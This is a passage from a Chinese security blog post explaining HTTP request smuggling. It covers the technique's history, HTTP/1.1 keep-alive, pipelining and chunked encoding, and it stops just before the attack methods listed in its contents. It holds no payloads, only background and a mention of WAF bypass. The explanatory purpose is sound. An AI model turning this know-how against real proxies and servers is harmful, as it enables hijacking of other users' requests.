<!doctype html><html lang=en-us dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="今年的 Defcon 27 与 Black Hat 上都有提到 HTTP DESYNC ATTACKS ，前几个月就想抽时间来研究研究了，奈何一直没什么时间，最近抽时间专门看了一下。\n"><title>一篇文章带你读懂 HTTP Smuggling 攻击</title>
<link rel=canonical href=https://zeddyu.github.io/p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-http-smuggling-%E6%94%BB%E5%87%BB/><link rel=stylesheet href=https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io///scss/style.min.css integrity="sha256-fF7AdIPMSCGGaIS7UZHBfGQpV0YU38aZCzY1ucpb+iU=" crossorigin=anonymous><meta property='og:title' content="一篇文章带你读懂 HTTP Smuggling 攻击"><meta property='og:description' content="今年的 Defcon 27 与 Black Hat 上都有提到 HTTP DESYNC ATTACKS ，前几个月就想抽时间来研究研究了，奈何一直没什么时间，最近抽时间专门看了一下。\n"><meta property='og:url' content='https://zeddyu.github.io/p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-http-smuggling-%E6%94%BB%E5%87%BB/'><meta property='og:site_name' content="Zeddy's Blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Sec'><meta property='article:published_time' content='2019-12-05T10:28:11+00:00'><meta property='article:modified_time' content='2019-12-05T10:28:11+00:00'><meta name=twitter:title content="一篇文章带你读懂 HTTP Smuggling 攻击"><meta name=twitter:description content="今年的 Defcon 27 与 Black Hat 上都有提到 HTTP DESYNC ATTACKS ，前几个月就想抽时间来研究研究了，奈何一直没什么时间，最近抽时间专门看了一下。\n"><link rel="shortcut icon" href=/favicon.ico><style>body:has(.article-content){.article-readmore { display: none; }}</style><script>enScroll=!1,enFdl=!1,extCurrent=void 0,filename=void 0,targetText=void 0,splitOrigin=void 0;const lStor=localStorage,sStor=sessionStorage,doc=document,docEl=document.documentElement,docBody=document.body,docLoc=document.location,w=window,s=screen,nav=navigator||{},extensions=["pdf","xls","xlsx","doc","docx","txt","rtf","csv","exe","key","pps","ppt","pptx","7z","pkg","rar","gz","zip","avi","mov","mp4","mpe","mpeg","wmv","mid","midi","mp3","wav","wma"];function a(e,t,n,o){const j="G-PDESKL57LT",r=()=>Math.floor(Math.random()*1e9)+1,c=()=>Math.floor(Date.now()/1e3),F=()=>(sStor._p||(sStor._p=r()),sStor._p),E=()=>r()+"."+c(),_=()=>(lStor.cid_v4||(lStor.cid_v4=E()),lStor.cid_v4),m=lStor.getItem("cid_v4"),v=()=>m?void 0:enScroll==!0?void 0:"1",p=()=>(sStor.sid||(sStor.sid=c()),sStor.sid),O=()=>{if(!sStor._ss)return sStor._ss="1",sStor._ss;if(sStor.getItem("_ss")=="1")return void 0},a="1",g=()=>{if(sStor.sct)if(enScroll==!0)return sStor.sct;else x=+sStor.getItem("sct")+ +a,sStor.sct=x;else sStor.sct=a;return sStor.sct},i=docLoc.search,b=new URLSearchParams(i),h=["q","s","search","query","keyword"],y=h.some(e=>i.includes("&"+e+"=")||i.includes("?"+e+"=")),u=()=>y==!0?"view_search_results":enScroll==!0?"scroll":enFdl==!0?"file_download":"page_view",f=()=>enScroll==!0?"90":void 0,C=()=>{if(u()=="view_search_results"){for(let e of b)if(h.includes(e[0]))return e[1]}else return void 0},d=encodeURIComponent,k=e=>{let t=[];for(let n in e)e.hasOwnProperty(n)&&e[n]!==void 0&&t.push(d(n)+"="+d(e[n]));return t.join("&")},A=!1,S="https://ga.zdy.one/collect_path",M=k({v:"2",tid:j,_p:F(),sr:(s.width*w.devicePixelRatio+"x"+s.height*w.devicePixelRatio).toString(),ul:(nav.language||void 0).toLowerCase(),cid:_(),_fv:v(),_s:"1",dl:docLoc.origin+docLoc.pathname+i,dt:doc.title||void 0,dr:doc.referrer||void 0,sid:p(),sct:g(),seg:"1",en:u(),"epn.percent_scrolled":f(),"ep.search_term":C(),"ep.file_extension":e||void 0,"ep.file_name":t||void 0,"ep.link_text":n||void 0,"ep.link_url":o||void 0,_ss:O(),_dbg:A?1:void 0}),l=S+"?"+M;if(nav.sendBeacon)nav.sendBeacon(l);else{let e=new XMLHttpRequest;e.open("POST",l,!0)}}a();function sPr(){return(docEl.scrollTop||docBody.scrollTop)/((docEl.scrollHeight||docBody.scrollHeight)-docEl.clientHeight)*100}doc.addEventListener("scroll",sEv,{passive:!0});function sEv(){const e=sPr();if(e<90)return;enScroll=!0,a(),doc.removeEventListener("scroll",sEv,{passive:!0}),enScroll=!1}document.addEventListener("DOMContentLoaded",function(){let e=document.getElementsByTagName("a");for(let t=0;t<e.length;t++)if(e[t].getAttribute("href")!=null){const n=e[t].getAttribute("href"),s=n.substring(n.lastIndexOf("/")+1),o=s.split(".").pop();(e[t].hasAttribute("download")||extensions.includes(o))&&e[t].addEventListener("click",fDl,{passive:!0})}});function fDl(e){enFdl=!0;const t=e.currentTarget.getAttribute("href"),n=t.substring(t.lastIndexOf("/")+1),s=n.split(".").pop(),o=n.replace("."+s,""),i=e.currentTarget.text,r=t.replace(docLoc.origin,"");a(s,o,i,r),enFdl=!1}</script></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky compact"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=https://cdn.zdy.one/gh/zeddyu/zeddyu.github.io//img/avatar_hu6396534569623136415.webp width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>Zeddy's Blog</a></h1><h2 class=site-description></h2></div></header><ol class=menu-social><li><a href=https://github.com/ZeddYu target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://zeddyu.github.io/atom.xml target=_blank title=Rss rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://x.com/ZeddYu_Lu target=_blank title=Twitter rel=me><svg class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M22 4.01c-1 .49-1.98.689-3 .99-1.121-1.265-2.783-1.335-4.38-.737S11.977 6.323 12 8v1c-3.245.083-6.135-1.395-8-4 0 0-4.182 7.433 4 11-1.872 1.247-3.739 2.088-6 2 3.308 1.803 6.913 2.423 10.034 1.517 3.58-1.04 6.522-3.723 7.651-7.742a13.84 13.84.0 00.497-3.753C20.18 7.773 21.692 5.25 22 4.009z"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
<span>Archives</span></a></li><li><a href=/ads/><svg class="icon icon-tabler icon-tabler-ad" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><rect x="3" y="5" width="18" height="14" rx="2"/><path d="M7 15v-4a2 2 0 014 0v4"/><line x1="7" y1="13" x2="11" y2="13"/><path d="M17 9v6h-1.5a1.5 1.5.0 111.5-1.5"/></svg>
<span>Advertisement</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#http-connection-mod>HTTP Connection Mod</a><ol><li><a href=#keep-alive>Keep-Alive</a></li><li><a href=#pipline>Pipline</a></li></ol></li><li><a href=#message-body>Message Body</a><ol><li><a href=#transfer-encoding>Transfer-Encoding</a></li></ol></li><li><a href=#background>Background</a></li><li><a href=#attack-method>Attack Method</a><ol><li><a href=#chunks-priority-on-content-length>Chunks Priority On Content-Length</a></li><li><a href=#bad-chunked-transmission>Bad Chunked Transmission</a></li><li><a href=#null-in-headers>Null In Headers</a></li><li><a href=#crlf>CRLF</a></li><li><a href=#size-issue>Size Issue</a></li><li><a href=#http-version>HTTP Version</a></li><li><a href=#has-a-cl-in-get>Has a CL in GET</a></li><li><a href=#two-identical-fields---cl>Two Identical Fields - CL</a></li><li><a href=#optional-whitespace>Optional WhiteSpace</a></li><li><a href=#cl-te>CL-TE</a></li><li><a href=#te-cl>TE-CL</a></li><li><a href=#two-identical-fields---te>Two Identical Fields - TE</a></li></ol></li><li><a href=#attack-surface>Attack Surface</a><ol><li><a href=#bypass-front-end-security-controls>Bypass Front-end Security Controls</a></li><li><a href=#revealing-front-end-request-rewriting>Revealing Front-end Request Rewriting</a></li><li><a href=#capturing-other-users-requests>Capturing other users&rsquo; requests</a></li><li><a href=#exploit-reflected-xss>Exploit Reflected XSS</a></li><li><a href=#turn-an-on-site-redirect-into-an-open-redirect>Turn An On-Site Redirect Into An Open Redirect</a></li><li><a href=#perform-web-cache-poisoning>Perform Web Cache Poisoning</a></li><li><a href=#perform-web-cache-deception>Perform Web Cache Deception</a></li></ol></li></ol><ol><li><a href=#paypal>Paypal</a></li><li><a href=#ats>ATS</a><ol><li><a href=#request-splitting-using-huge-header>Request Splitting using Huge Header</a></li></ol></li><li><a href=#jetty>Jetty</a><ol><li><a href=#http09>HTTP/0.9</a></li><li><a href=#chunk-size-attribute-truncation>Chunk size attribute truncation</a></li></ol></li><li><a href=#websocket>Websocket</a></li><li><a href=#golang>Golang</a></li><li><a href=#something-else>Something Else</a></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/sec/ style=background-color:#0b0;color:#fff>Sec</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-http-smuggling-%E6%94%BB%E5%87%BB/>一篇文章带你读懂 HTTP Smuggling 攻击</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
<time class=article-time--published>Dec 05, 2019</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
<time class=article-time--reading>32 minute read</time></div><div class=article-readmore><a href=/p/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E8%AF%BB%E6%87%82-http-smuggling-%E6%94%BB%E5%87%BB/>Read More…</a></div></footer></div></header><section class=article-content><p>今年的 Defcon 27 与 Black Hat 上都有提到 HTTP DESYNC ATTACKS ，前几个月就想抽时间来研究研究了，奈何一直没什么时间，最近抽时间专门看了一下。</p><p>在前些天研究的时候，恰巧 <strong>mengchen@知道创宇404实验室</strong> 也发表了<a class=link href=https://paper.seebug.org/1048/ target=_blank rel=noopener>协议层的攻击——HTTP请求走私</a>文章，也带给了自己更多的启示，师傅的文章写的非常的不错，墙裂建议阅读，这里我结合师傅的文章跟自己的一些理解进行一些整理，本文亦可理解为那篇文章的补充与更详细的描述。</p><p>整篇文章由于自己时间问题，前前后后拖了两个月左右，中间时间间隔可能比较久，所以文章会有比较多的疏漏，还请师傅们看后直接指出斧正。写作不易，还请师傅们多多担待。最近也一直在关注这方面的安全问题，欢迎一起学习讨论: ) 联系方式：emVkZHl1Lmx1QGdtYWlsLmNvbQ==</p><p>后续如果有新的总结发现也会发自己的<a class=link href=https://zeddyu.github.io target=_blank rel=noopener>垃圾博客</a>或者先知（就看国际黑客陈师傅给不给过了）</p><h1 id=tlnr>TL;NR</h1><p><img src=https://blogpic.zdy.one/img/20191205171217.jpeg loading=lazy></p><p>Pic from <a class=link href="https://twitter.com/SpiderSec/status/1200413390339887104?s=19" target=_blank rel=noopener>https://twitter.com/SpiderSec/status/1200413390339887104?s=19</a></p><h1 id=timeline>TimeLine</h1><p>在我们提 HTTP Smuggling 之前我们首先来看看其中的演变过程：</p><p>@Amit Klein 在 2004 年提出 <a class=link href=https://dl.packetstormsecurity.net/papers/general/whitepaper_httpresponse.pdf target=_blank rel=noopener>HTTP Response Splitting</a> 技术，是 HTTP Smuggling 攻击的雏形。</p><p>关于 HTTP Smuggling 这种攻击方式在 2005 年已由 @Watchfire 首次提出 <a class=link href=https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf target=_blank rel=noopener>HTTP Request Smuggling</a> 。</p><p>HTTP Parameter Pollution (HPP)，也就是 HTTP 参数污染，这其实也算是一种"特殊"的 HTTP Smuggling 攻击，在 2009 年由 @Stefano di Paola & @Luca Carettoni 在 OWASP Poland conference 上首次提出，一经提出就引起了比较大的轰动，被广泛运用在绕过 WAF 当中。</p><p>2016 年 Defcon 24 ，@regilero 提出了 <a class=link href=https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEF%20CON%2024%20-%20Regilero-Hiding-Wookiees-In-Http.pdf target=_blank rel=noopener>Hiding Wookiees In Http</a>，进一步揭示了 HTTP Smuggling 这种攻击方式。</p><p>2019 年 Defcon 27， @James Kettle 提出了 <a class=link href=https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-27-albinowax-HTTP-Desync-Attacks.pdf target=_blank rel=noopener>HTTP Desync Attacks: Smashing into the Cell Next Door</a>，讲解了如何用 HTTP Smuggling 技术挖掘到了 Paypal 的漏洞。</p><h1 id=causes>Causes</h1><p>然而@James Kettle 的 PPT 里面也并没有非常详细细致地讲述这个攻击是什么，以及怎么形成的，当初自己看完还是抱着非常大的疑惑的，后来学习了 @regilero 博客中关于 <a class=link href=https://regilero.github.io/tag/Smuggling/ target=_blank rel=noopener>HTTP Smuggling 的文章</a>，我才有了清晰的认识。</p><h2 id=http-connection-mod>HTTP Connection Mod</h2><blockquote><p>​ 在<code>HTTP1.0</code>之前的协议设计中，客户端每进行一次HTTP请求，就需要同服务器建立一个TCP链接。而现代的Web网站页面是由多种资源组成的，我们要获取一个网页的内容，不仅要请求HTML文档，还有JS、CSS、图片等各种各样的资源，这样如果按照之前的协议设计，就会导致HTTP服务器的负载开销增大。于是在<code>HTTP1.1</code>中，增加了<code>Keep-Alive</code>和<code>Pipeline</code>这两个特性。</p></blockquote><h3 id=keep-alive>Keep-Alive</h3><p>根据 <a class=link href=https://tools.ietf.org/html/rfc7230#section-6 target=_blank rel=noopener>RFC7230</a> 我们可以知道</p><blockquote><p>​ HTTP/1.1 defaults to the use of &ldquo;persistent connections&rdquo;, allowing multiple requests and responses to be carried over a single connection. The &ldquo;close&rdquo; connection option is used to signal that a connection will not persist after the current request/response. HTTP implementations SHOULD support persistent connections.</p></blockquote><p>在 HTTP/1.1 中默认使用<code>Keep-Alive</code>，从而允许在单个连接上承载多个请求和响应。</p><blockquote><p>所谓<code>Keep-Alive</code>，就是在HTTP请求中增加一个特殊的请求头<code>Connection: Keep-Alive</code>，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接，这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。当然，这个特性在<code>HTTP1.1</code>中是默认开启的。</p></blockquote><p>当然，有些请求带着<code>Connection: close</code>的话，通信完成之后，服务器会中断 TCP 连接。</p><h3 id=pipline>Pipline</h3><blockquote><p>有了<code>Keep-Alive</code>之后，后续就有了<code>Pipeline</code>，在这里呢，客户端可以像流水线一样发送自己的HTTP请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。</p><p>现如今，浏览器默认是不启用<code>Pipeline</code>的，但是一般的服务器都提供了对<code>Pipleline</code>的支持。</p></blockquote><p>在 HTTP/1.1 中比较重要的引入就是 pipeline 技术了，以下是使用以及不使用 piepeline 技术的对比图：</p><p><img src=https://blogpic.zdy.one/img/20191017234109.png loading=lazy></p><p>我们可以清晰地看到，使用了 pipeline 之后不必再需要等待前一个请求完成其响应再处理第二个请求了，这个有点异步处理的意思在里面。</p><h2 id=message-body>Message Body</h2><p><a class=link href=https://tools.ietf.org/html/rfc7230#section-3.3 target=_blank rel=noopener>https://tools.ietf.org/html/rfc7230#section-3.3</a></p><h3 id=transfer-encoding>Transfer-Encoding</h3><blockquote><p>​ Transfer-Encoding is analogous to the Content-Transfer-Encoding field of MIME, which was designed to enable safe transport of binary data over a 7-bit transport service ([RFC2045], Section 6). However, safe transport has a different focus for an 8bit-clean transfer protocol. In HTTP&rsquo;s case, Transfer-Encoding is primarily intended to accurately delimit a dynamically generated payload and to distinguish payload encodings that are only applied for transport efficiency or security from those that are characteristics of the selected resource.</p></blockquote><p>Transfer-Encoding 是一种被设计用来支持 7-bit 传输服务安全传输二进制数据的字段，有点类似于 MIME (Multipurpose Internet Mail Extensions) Header 中的 Content-Transfer-Encoding 。在HTTP的情况下，Transfer-Encoding 的主要用来以指定的编码形式编码 payload body 安全地传输给用户。在 HTTP/1.1 中引入，在 HTTP/2 中取消。</p><p><a class=link href=https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding target=_blank rel=noopener>MDN</a> 列举了几种属性：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>chunked | compress | deflate | gzip | identity
</span></span></code></pre></td></tr></table></div></div><p>我们这里主要关注 chunked 这一种传输编码方式，它在网络攻击中也不是第一次提及了，之前就有师傅利用这个字段去绕过一些 WAF，可以参考 <a class=link href=https://www.freebuf.com/articles/web/194351.html target=_blank rel=noopener>利用分块传输吊打所有WAF</a>，也是比较有意思的 bypass 技巧。</p><p>我们可以在<a class=link href=https://tools.ietf.org/html/rfc7230#section-4.1 target=_blank rel=noopener>RFC7230</a>中查看到有关分块传输的定义规范。</p><blockquote><p>4.1. Chunked Transfer Coding</p><p>The chunked transfer coding wraps the payload body in order to
transfer it as a series of chunks, each with its own size indicator,
followed by an OPTIONAL trailer containing header fields. Chunked
enables content streams of unknown size to be transferred as a
sequence of length-delimited buffers, which enables the sender to
retain connection persistence and the recipient to know when it has
received the entire message.</p><pre><code> chunked-body   = *chunk
                  last-chunk
                  trailer-part
                  CRLF

 chunk          = chunk-size [ chunk-ext ] CRLF
                  chunk-data CRLF
 chunk-size     = 1*HEXDIG
 last-chunk     = 1*(&quot;0&quot;) [ chunk-ext ] CRLF

 chunk-data     = 1*OCTET ; a sequence of chunk-size octets
</code></pre><p>The chunk-size field is a string of hex digits indicating the size of
the chunk-data in octets. The chunked transfer coding is complete
when a chunk with a chunk-size of zero is received, possibly followed
by a trailer, and finally terminated by an empty line.</p><p>A recipient MUST be able to parse and decode the chunked transfer
coding.</p><p>4.1.1. Chunk Extensions</p><p>The chunked encoding allows each chunk to include zero or more chunk
extensions, immediately following the chunk-size, for the sake of
supplying per-chunk metadata (such as a signature or hash),
mid-message control information, or randomization of message body
size.</p><pre><code> chunk-ext      = *( &quot;;&quot; chunk-ext-name [ &quot;=&quot; chunk-ext-val ] )

 chunk-ext-name = token
 chunk-ext-val  = token / quoted-string
</code></pre><p>The chunked encoding is specific to each connection and is likely to
be removed or recoded by each recipient (including intermediaries)
before any higher-level application would have a chance to inspect
the extensions. Hence, use of chunk extensions is generally limited</p><p>to specialized HTTP services such as &ldquo;long polling&rdquo; (where client and
server can have shared expectations regarding the use of chunk
extensions) or for padding within an end-to-end secured connection.</p><p>A recipient MUST ignore unrecognized chunk extensions. A server
ought to limit the total length of chunk extensions received in a
request to an amount reasonable for the services provided, in the
same way that it applies length limitations and timeouts for other
parts of a message, and generate an appropriate 4xx (Client Error)
response if that amount is exceeded.</p></blockquote><p>这里如果你不想看的太仔细，我们只需要了解它是怎么一种结构就行了，这里也可以参考 <a class=link href=https://en.wikipedia.org/wiki/Chunked_transfer_encoding target=_blank rel=noopener>Wiki: Chunked transfer encoding</a> ，比如说我们如果要使用 chunked 发送以下消息</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>Wikipedia in\r\n\r\nchunks.
</span></span></code></pre></td></tr></table></div></div><p>我们可以这么去发送：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=err>POSTT /xxx HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=err>Host: xxx
</span></span></span><span class=line><span class=cl><span class=err>Content-Type: text/plain 
</span></span></span><span class=line><span class=cl><span class=err>Transfer-Encoding: chunked
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>4\r\n
</span></span></span><span class=line><span class=cl><span class=err>Wiki\r\n
</span></span></span><span class=line><span class=cl><span class=err>5\r\n
</span></span></span><span class=line><span class=cl><span class=err>pedia\r\n
</span></span></span><span class=line><span class=cl><span class=err>e\r\n
</span></span></span><span class=line><span class=cl><span class=err> in\r\n\r\nchunks.\r\n
</span></span></span><span class=line><span class=cl><span class=err>0\r\n
</span></span></span><span class=line><span class=cl><span class=err>\r\n
</span></span></span></code></pre></td></tr></table></div></div><p>这里做个简单解释，<strong>我们使用<code>\r\n</code>表示 CRLF ，所以这里的<code>\r\n</code>是两个字节</strong>；第一个数字 4 表示的是接下来会有 4 个字节的数据，也就是 Wiki 这 4 个字母，然后按照 RFC 文档标准，字母 Wiki 部分后面需要跟<code>\r\n</code>表示 chunk-data 部分，数字 4 后面需要跟<code>\r\n</code>表示 chunk-size 部分，而且这个数字是个十六进制数，比如第三个数据，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>e\r\n
</span></span><span class=line><span class=cl>in\r\n\r\nchunks.\r\n
</span></span></code></pre></td></tr></table></div></div><p>这里第一个存在空格，数据当中的<code>\r\n</code>算两个字符，最后一个<code>\r\n</code>表示数据结束，这样的话，第一个空格 1 个字节 + in 2个字节 + 2 个 <code>\r\n</code> 算 4 个字节 + chunks. 7个字节 = 14 个字节，十六进制表示 14 也就是 e 。</p><p>最后一个<code>0\r\n\r\n</code>表示 chunk 部分结束。</p><h2 id=background>Background</h2><p>本身这些东西是没有什么危害的，都是通过各种方式提高网络传输速率，但是在一些特殊的情况下就会出现了一些相应的安全问题。</p><blockquote><p>​ 为了提升用户的浏览速度，提高使用体验，减轻服务器的负担，很多网站都用上了CDN加速服务，最简单的加速服务，就是在源站的前面加上一个具有缓存功能的反向代理服务器，用户在请求某些静态资源时，直接从代理服务器中就可以获取到，不用再从源站所在服务器获取。这就有了一个很典型的拓扑结构。</p></blockquote><p>这里引用 @mengchen 师傅发的图：</p><p><img src=https://blogpic.zdy.one/img/20191205171057.png loading=lazy></p><p>一般来说，反向代理与后端服务器不会使用 pipeline 技术，甚至也不会去使用 Keep-Alive ，更多时候反向代理采取的措施是重用 TCP 链接，因为对于反向代理与后端服务器来说，反向代理服务器与后端服务器 IP 相对固定，不同用户的请求通过代理服务器与后端服务器建立链接，将这两者之间的 TCP 链接进行重用，也就顺理成章了。</p><p><img src=https://blogpic.zdy.one/img/20191130132520.png loading=lazy></p><p><img src=https://blogpic.zdy.one/img/20191130132258.png loading=lazy></p><p><img src=https://blogpic.zdy.one/img/20191130132605.png loading=lazy></p><blockquote><p>​ 当我们向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，可能代理服务器认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。</p></blockquote><p>HTTP Smuggling 攻击正是基于反向代理与后端服务器对于 HTTP 请求解析处理不一致，利用这种差异性我们可以在一个 HTTP 请求中 